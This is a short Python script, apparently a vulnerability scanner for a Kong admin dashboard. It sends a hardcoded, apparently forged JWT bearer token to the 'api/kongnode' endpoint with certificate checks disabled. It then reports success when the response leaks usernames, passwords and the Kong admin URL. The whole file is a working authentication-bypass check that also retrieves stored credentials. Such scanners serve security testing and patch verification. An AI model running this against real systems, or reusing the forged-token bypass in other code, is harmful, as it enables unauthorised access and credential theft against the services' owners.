import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/kongnode"
	headers={'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "username" in response.text and "password" in response.text and "kong_admin_url" in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
